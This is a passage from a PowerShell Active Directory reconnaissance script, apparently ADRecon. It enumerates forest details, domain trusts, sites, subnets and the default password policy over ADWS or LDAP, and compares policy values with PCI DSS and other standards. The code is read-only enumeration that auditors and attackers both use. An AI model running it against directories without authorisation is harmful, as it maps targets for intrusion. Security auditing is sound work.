                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Disabled"
                $ForestObj += $Obj
            }
            Remove-Variable ADForest
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain",$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning "[Get-ADRForest] Error getting Domain Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }
            Remove-Variable DomainContext

            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Forest",$($ADDomain.Forest),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Remove-Variable ADDomain
            Try
            {
                $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            Catch
            {
                Write-Warning "[Get-ADRForest] Error getting Forest Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }
            Remove-Variable ForestContext

            # Get Tombstone Lifetime
            Try
            {
                $SearchPath = "CN=Directory Service,CN=Windows NT,CN=Services"
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.configurationNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                $objSearcherPath.Filter="(name=Directory Service)"
                $objSearcherResult = $objSearcherPath.FindAll()
                $ADForestTombstoneLifetime = $objSearcherResult.Properties.tombstoneLifetime
                Remove-Variable SearchPath
                $objSearchPath.Dispose()
                $objSearcherPath.Dispose()
                $objSearcherResult.Dispose()
            }
            Catch
            {
                Write-Warning "[Get-ADRForest] Error retrieving Tombstone Lifetime"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
            # Check Recycle Bin Feature Status
            If ([convert]::ToInt32($objDomainRootDSE.forestFunctionality,10) -ge 6)
            {
                Try
                {
                    $SearchPath = "CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration"
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                    $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                    $ADRecycleBin = $objSearcherPath.FindAll()
                    Remove-Variable SearchPath
                    $objSearchPath.Dispose()
                    $objSearcherPath.Dispose()
                }
                Catch
                {
                    Write-Warning "[Get-ADRForest] Error retrieving Recycle Bin Feature"
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                }
            }
            # Check Privileged Access Management Feature status
            If ([convert]::ToInt32($objDomainRootDSE.forestFunctionality,10) -ge 7)
            {
                Try
                {
                    $SearchPath = "CN=Privileged Access Management Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration"
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                    $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                    $PrivilegedAccessManagement = $objSearcherPath.FindAll()
                    Remove-Variable SearchPath
                    $objSearchPath.Dispose()
                    $objSearcherPath.Dispose()
                }
                Catch
                {
                    Write-Warning "[Get-ADRForest] Error retrieving Privileged Access Management Feature"
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                }
            }
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

            # Get Tombstone Lifetime
            $ADForestTombstoneLifetime = ([ADSI]"LDAP://CN=Directory Service,CN=Windows NT,CN=Services,$($objDomainRootDSE.configurationNamingContext)").tombstoneLifetime.value

            # Check Recycle Bin Feature Status
            If ([convert]::ToInt32($objDomainRootDSE.forestFunctionality,10) -ge 6)
            {
                $ADRecycleBin = ([ADSI]"LDAP://CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$($objDomain.distinguishedName)")
            }
            # Check Privileged Access Management Feature Status
            If ([convert]::ToInt32($objDomainRootDSE.forestFunctionality,10) -ge 7)
            {
                $PrivilegedAccessManagement = ([ADSI]"LDAP://CN=Privileged Access Management Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$($objDomain.distinguishedName)")
            }
        }

        If ($ADForest)
        {
            $ForestObj = @()

            # Values taken from https://technet.microsoft.com/en-us/library/hh852281(v=wps.630).aspx
            $FLAD = @{
	            0 = "Windows2000";
	            1 = "Windows2003/Interim";
	            2 = "Windows2003";
	            3 = "Windows2008";
	            4 = "Windows2008R2";
	            5 = "Windows2012";
	            6 = "Windows2012R2";
                7 = "Windows2016"
            }
            $ForestMode = $FLAD[[convert]::ToInt32($objDomainRootDSE.forestFunctionality,10)] + "Forest"
            Remove-Variable FLAD

            $ObjValues = @("Name", $ADForest.Name, "Functional Level", $ForestMode, "Domain Naming Master", $ADForest.NamingRoleOwner, "Schema Master", $ADForest.SchemaRoleOwner, "RootDomain", $ADForest.RootDomain, "Domain Count", $ADForest.Domains.Count, "Site Count", $ADForest.Sites.Count, "Global Catalog Count", $ADForest.GlobalCatalogs.Count)

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ObjValues[$i+1]
                $i++
                $ForestObj += $Obj
            }
            Remove-Variable ForestMode

            For($i=0; $i -lt $ADForest.Domains.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Domain"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADForest.Domains[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest.Sites.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Site"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADForest.Sites[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest.GlobalCatalogs.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "GlobalCatalog"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADForest.GlobalCatalogs[$i]
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Tombstone Lifetime"
            If ($ADForestTombstoneLifetime)
            {
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADForestTombstoneLifetime
                Remove-Variable ADForestTombstoneLifetime
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Not Retrieved"
            }
            $ForestObj += $Obj

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Recycle Bin (2008 R2 onwards)"
            If ($ADRecycleBin)
            {
                If ($ADRecycleBin.Properties.'msDS-EnabledFeatureBL'.Count -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Enabled"
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($ADRecycleBin.Properties.'msDS-EnabledFeatureBL'.Count); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Enabled Scope"
                        $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADRecycleBin.Properties.'msDS-EnabledFeatureBL'[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Disabled"
                    $ForestObj += $Obj
                }
                Remove-Variable ADRecycleBin
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Disabled"
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Privileged Access Management (2016 onwards)"
            If ($PrivilegedAccessManagement)
            {
                If ($PrivilegedAccessManagement.Properties.'msDS-EnabledFeatureBL'.Count -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Enabled"
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($PrivilegedAccessManagement.Properties.'msDS-EnabledFeatureBL'.Count); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Enabled Scope"
                        $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $PrivilegedAccessManagement.Properties.'msDS-EnabledFeatureBL'[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Disabled"
                    $ForestObj += $Obj
                }
                Remove-Variable PrivilegedAccessManagement
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Disabled"
                $ForestObj += $Obj
            }

            Remove-Variable ADForest
        }
    }

    If ($ForestObj)
    {
        Return $ForestObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRTrust
{
<#
.SYNOPSIS
    Returns the Trusts of the current (or specified) domain.

.DESCRIPTION
    Returns the Trusts of the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    # Values taken from https://msdn.microsoft.com/en-us/library/cc223768.aspx
    $TDAD = @{
        0 = "Disabled";
        1 = "Inbound";
        2 = "Outbound";
        3 = "BiDirectional";
    }

    # Values taken from https://msdn.microsoft.com/en-us/library/cc223771.aspx
    $TTAD = @{
        1 = "Downlevel";
        2 = "Uplevel";
        3 = "MIT";
        4 = "DCE";
    }

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADTrusts = Get-ADObject -LDAPFilter "(objectClass=trustedDomain)" -Properties DistinguishedName,trustPartner,trustdirection,trusttype,TrustAttributes,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning "[Get-ADRTrust] Error while enumerating trustedDomain Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADTrusts)
        {
            Write-Verbose "[*] Total Trusts: $([ADRecon.ADWSClass]::ObjectCount($ADTrusts))"
            # Trust Info
            $ADTrustObj = @()
            $ADTrusts | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Source Domain" -Value (Get-DNtoFQDN $_.DistinguishedName)
                $Obj | Add-Member -MemberType NoteProperty -Name "Target Domain" -Value $_.trustPartner
                $TrustDirection = [string] $TDAD[$_.trustdirection]
                $Obj | Add-Member -MemberType NoteProperty -Name "Trust Direction" -Value $TrustDirection
                $TrustType = [string] $TTAD[$_.trusttype]
                $Obj | Add-Member -MemberType NoteProperty -Name "Trust Type" -Value $TrustType

                $TrustAttributes = $null
                If ([int32] $_.TrustAttributes -band 0x00000001) { $TrustAttributes += "Non Transitive," }
                If ([int32] $_.TrustAttributes -band 0x00000002) { $TrustAttributes += "UpLevel," }
                If ([int32] $_.TrustAttributes -band 0x00000004) { $TrustAttributes += "Quarantined," } #SID Filtering
                If ([int32] $_.TrustAttributes -band 0x00000008) { $TrustAttributes += "Forest Transitive," }
                If ([int32] $_.TrustAttributes -band 0x00000010) { $TrustAttributes += "Cross Organization," } #Selective Auth
                If ([int32] $_.TrustAttributes -band 0x00000020) { $TrustAttributes += "Within Forest," }
                If ([int32] $_.TrustAttributes -band 0x00000040) { $TrustAttributes += "Treat as External," }
                If ([int32] $_.TrustAttributes -band 0x00000080) { $TrustAttributes += "Uses RC4 Encryption," }
                If ([int32] $_.TrustAttributes -band 0x00000200) { $TrustAttributes += "No TGT Delegation," }
                If ([int32] $_.TrustAttributes -band 0x00000400) { $TrustAttributes += "PIM Trust," }
                If ($TrustAttributes)
                {
                    $TrustAttributes = $TrustAttributes.TrimEnd(",")
                }
                $Obj | Add-Member -MemberType NoteProperty -Name "Attributes" -Value $TrustAttributes
                $Obj | Add-Member -MemberType NoteProperty -Name "whenCreated" -Value ([DateTime] $($_.whenCreated))
                $Obj | Add-Member -MemberType NoteProperty -Name "whenChanged" -Value ([DateTime] $($_.whenChanged))
                $ADTrustObj += $Obj
            }
            Remove-Variable ADTrusts
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectClass=trustedDomain)"
        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedname","trustpartner","trustdirection","trusttype","trustattributes","whencreated","whenchanged"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADTrusts = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRTrust] Error while enumerating trustedDomain Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADTrusts)
        {
            Write-Verbose "[*] Total Trusts: $([ADRecon.LDAPClass]::ObjectCount($ADTrusts))"
            # Trust Info
            $ADTrustObj = @()
            $ADTrusts | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Source Domain" -Value $(Get-DNtoFQDN ([string] $_.Properties.distinguishedname))
                $Obj | Add-Member -MemberType NoteProperty -Name "Target Domain" -Value $([string] $_.Properties.trustpartner)
                $TrustDirection = [string] $TDAD[$_.Properties.trustdirection]
                $Obj | Add-Member -MemberType NoteProperty -Name "Trust Direction" -Value $TrustDirection
                $TrustType = [string] $TTAD[$_.Properties.trusttype]
                $Obj | Add-Member -MemberType NoteProperty -Name "Trust Type" -Value $TrustType

                $TrustAttributes = $null
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000001) { $TrustAttributes += "Non Transitive," }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000002) { $TrustAttributes += "UpLevel," }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000004) { $TrustAttributes += "Quarantined," } #SID Filtering
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000008) { $TrustAttributes += "Forest Transitive," }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000010) { $TrustAttributes += "Cross Organization," } #Selective Auth
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000020) { $TrustAttributes += "Within Forest," }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000040) { $TrustAttributes += "Treat as External," }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000080) { $TrustAttributes += "Uses RC4 Encryption," }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000200) { $TrustAttributes += "No TGT Delegation," }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000400) { $TrustAttributes += "PIM Trust," }
                If ($TrustAttributes)
                {
                    $TrustAttributes = $TrustAttributes.TrimEnd(",")
                }
                $Obj | Add-Member -MemberType NoteProperty -Name "Attributes" -Value $TrustAttributes
                $Obj | Add-Member -MemberType NoteProperty -Name "whenCreated" -Value ([DateTime] $($_.Properties.whencreated))
                $Obj | Add-Member -MemberType NoteProperty -Name "whenChanged" -Value ([DateTime] $($_.Properties.whenchanged))
                $ADTrustObj += $Obj
            }
            Remove-Variable ADTrusts
        }
    }

    If ($ADTrustObj)
    {
        Return $ADTrustObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRSite
{
<#
.SYNOPSIS
    Returns the Sites of the current (or specified) domain.

.DESCRIPTION
    Returns the Sites of the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $SearchPath = "CN=Sites"
            $ADSites = Get-ADObject -SearchBase "$SearchPath,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter "(objectClass=site)" -Properties Name,Description,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning "[Get-ADRSite] Error while enumerating Site Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADSites)
        {
            Write-Verbose "[*] Total Sites: $([ADRecon.ADWSClass]::ObjectCount($ADSites))"
            # Sites Info
            $ADSiteObj = @()
            $ADSites | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Name" -Value $_.Name
                $Obj | Add-Member -MemberType NoteProperty -Name "Description" -Value $_.Description
                $Obj | Add-Member -MemberType NoteProperty -Name "whenCreated" -Value $_.whenCreated
                $Obj | Add-Member -MemberType NoteProperty -Name "whenChanged" -Value $_.whenChanged
                $ADSiteObj += $Obj
            }
            Remove-Variable ADSites
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $SearchPath = "CN=Sites"
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher.Filter = "(objectClass=site)"
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADSites = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRSite] Error while enumerating Site Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADSites)
        {
            Write-Verbose "[*] Total Sites: $([ADRecon.LDAPClass]::ObjectCount($ADSites))"
            # Site Info
            $ADSiteObj = @()
            $ADSites | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Name" -Value $([string] $_.Properties.name)
                $Obj | Add-Member -MemberType NoteProperty -Name "Description" -Value $([string] $_.Properties.description)
                $Obj | Add-Member -MemberType NoteProperty -Name "whenCreated" -Value ([DateTime] $($_.Properties.whencreated))
                $Obj | Add-Member -MemberType NoteProperty -Name "whenChanged" -Value ([DateTime] $($_.Properties.whenchanged))
                $ADSiteObj += $Obj
            }
            Remove-Variable ADSites
        }
    }

    If ($ADSiteObj)
    {
        Return $ADSiteObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRSubnet
{
<#
.SYNOPSIS
    Returns the Subnets of the current (or specified) domain.

.DESCRIPTION
    Returns the Subnets of the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $SearchPath = "CN=Subnets,CN=Sites"
            $ADSubnets = Get-ADObject -SearchBase "$SearchPath,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter "(objectClass=subnet)" -Properties Name,Description,siteObject,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning "[Get-ADRSubnet] Error while enumerating Subnet Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADSubnets)
        {
            Write-Verbose "[*] Total Subnets: $([ADRecon.ADWSClass]::ObjectCount($ADSubnets))"
            # Subnets Info
            $ADSubnetObj = @()
            $ADSubnets | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Site" -Value $(($_.siteObject -Split ",")[0] -replace 'CN=','')
                $Obj | Add-Member -MemberType NoteProperty -Name "Name" -Value $_.Name
                $Obj | Add-Member -MemberType NoteProperty -Name "Description" -Value $_.Description
                $Obj | Add-Member -MemberType NoteProperty -Name "whenCreated" -Value $_.whenCreated
                $Obj | Add-Member -MemberType NoteProperty -Name "whenChanged" -Value $_.whenChanged
                $ADSubnetObj += $Obj
            }
            Remove-Variable ADSubnets
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $SearchPath = "CN=Subnets,CN=Sites"
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher.Filter = "(objectClass=subnet)"
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADSubnets = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRSubnet] Error while enumerating Subnet Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADSubnets)
        {
            Write-Verbose "[*] Total Subnets: $([ADRecon.LDAPClass]::ObjectCount($ADSubnets))"
            # Subnets Info
            $ADSubnetObj = @()
            $ADSubnets | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Site" -Value $((([string] $_.Properties.siteobject) -Split ",")[0] -replace 'CN=','')
                $Obj | Add-Member -MemberType NoteProperty -Name "Name" -Value $([string] $_.Properties.name)
                $Obj | Add-Member -MemberType NoteProperty -Name "Description" -Value $([string] $_.Properties.description)
                $Obj | Add-Member -MemberType NoteProperty -Name "whenCreated" -Value ([DateTime] $($_.Properties.whencreated))
                $Obj | Add-Member -MemberType NoteProperty -Name "whenChanged" -Value ([DateTime] $($_.Properties.whenchanged))
                $ADSubnetObj += $Obj
            }
            Remove-Variable ADSubnets
        }
    }

    If ($ADSubnetObj)
    {
        Return $ADSubnetObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRDefaultPasswordPolicy
{
<#
.SYNOPSIS
    Returns the Default Password Policy of the current (or specified) domain.

.DESCRIPTION
    Returns the Default Password Policy of the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADpasspolicy = Get-ADDefaultDomainPasswordPolicy
        }
        Catch
        {
            Write-Warning "[Get-ADRDefaultPasswordPolicy] Error while enumerating the Default Password Policy"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADpasspolicy)
        {
            $ObjValues = @( "Enforce password history (passwords)", $ADpasspolicy.PasswordHistoryCount, "4", "Req. 8.2.5", "8", "Control: 0423", "24 or more",
            "Maximum password age (days)", $ADpasspolicy.MaxPasswordAge.days, "90", "Req. 8.2.4", "90", "Control: 0423", "1 to 60",
            "Minimum password age (days)", $ADpasspolicy.MinPasswordAge.days, "N/A", "-", "1", "Control: 0423", "1 or more",
            "Minimum password length (characters)", $ADpasspolicy.MinPasswordLength, "7", "Req. 8.2.3", "13", "Control: 0421", "14 or more",
            "Password must meet complexity requirements", $ADpasspolicy.ComplexityEnabled, $true, "Req. 8.2.3", $true, "Control: 0421", $true,
            "Store password using reversible encryption for all users in the domain", $ADpasspolicy.ReversibleEncryptionEnabled, "N/A", "-", "N/A", "-", $false,
            "Account lockout duration (mins)", $ADpasspolicy.LockoutDuration.minutes, "0 (manual unlock) or 30", "Req. 8.1.7", "N/A", "-", "15 or more",
            "Account lockout threshold (attempts)", $ADpasspolicy.LockoutThreshold, "1 to 6", "Req. 8.1.6", "1 to 5", "Control: 1403", "1 to 10",
            "Reset account lockout counter after (mins)", $ADpasspolicy.LockoutObservationWindow.minutes, "N/A", "-", "N/A", "-", "15 or more" )

            Remove-Variable ADpasspolicy
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        If ($ObjDomain)
        {
            #Value taken from https://msdn.microsoft.com/en-us/library/ms679431(v=vs.85).aspx
            $pwdProperties = @{
                "DOMAIN_PASSWORD_COMPLEX" = 1;
                "DOMAIN_PASSWORD_NO_ANON_CHANGE" = 2;
                "DOMAIN_PASSWORD_NO_CLEAR_CHANGE" = 4;
                "DOMAIN_LOCKOUT_ADMINS" = 8;
                "DOMAIN_PASSWORD_STORE_CLEARTEXT" = 16;
                "DOMAIN_REFUSE_PASSWORD_CHANGE" = 32
            }

            If (($ObjDomain.pwdproperties.value -band $pwdProperties["DOMAIN_PASSWORD_COMPLEX"]) -eq $pwdProperties["DOMAIN_PASSWORD_COMPLEX"])
            {
                $ComplexPasswords = $true
            }
            Else
            {
                $ComplexPasswords = $false
            }

            If (($ObjDomain.pwdproperties.value -band $pwdProperties["DOMAIN_PASSWORD_STORE_CLEARTEXT"]) -eq $pwdProperties["DOMAIN_PASSWORD_STORE_CLEARTEXT"])
            {
                $ReversibleEncryption = $true
            }
            Else
            {
                $ReversibleEncryption = $false
            }

            $LockoutDuration = $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.lockoutduration.value)/-600000000)

            If ($LockoutDuration -gt 99999)
            {
                $LockoutDuration = 0
            }

            $ObjValues = @( "Enforce password history (passwords)", $ObjDomain.PwdHistoryLength.value, "4", "Req. 8.2.5", "8", "Control: 0423", "24 or more",
            "Maximum password age (days)", $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.maxpwdage.value) /-864000000000), "90", "Req. 8.2.4", "90", "Control: 0423", "1 to 60",
            "Minimum password age (days)", $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.minpwdage.value) /-864000000000), "N/A", "-", "1", "Control: 0423", "1 or more",
            "Minimum password length (characters)", $ObjDomain.MinPwdLength.value, "7", "Req. 8.2.3", "13", "Control: 0421", "14 or more",
            "Password must meet complexity requirements", $ComplexPasswords, $true, "Req. 8.2.3", $true, "Control: 0421", $true,
            "Store password using reversible encryption for all users in the domain", $ReversibleEncryption, "N/A", "-", "N/A", "-", $false,
            "Account lockout duration (mins)", $LockoutDuration, "0 (manual unlock) or 30", "Req. 8.1.7", "N/A", "-", "15 or more",
            "Account lockout threshold (attempts)", $ObjDomain.LockoutThreshold.value, "1 to 6", "Req. 8.1.6", "1 to 5", "Control: 1403", "1 to 10",
            "Reset account lockout counter after (mins)", $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.lockoutobservationWindow.value)/-600000000), "N/A", "-", "N/A", "-", "15 or more" )

            Remove-Variable pwdProperties
            Remove-Variable ComplexPasswords
            Remove-Variable ReversibleEncryption
        }
    }

    If ($ObjValues)
    {
        $ADPassPolObj = @()
        For ($i = 0; $i -lt $($ObjValues.Count); $i++)
        {
            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Policy" -Value $ObjValues[$i]
            $Obj | Add-Member -MemberType NoteProperty -Name "Current Value" -Value $ObjValues[$i+1]
            $Obj | Add-Member -MemberType NoteProperty -Name "PCI DSS Requirement" -Value $ObjValues[$i+2]
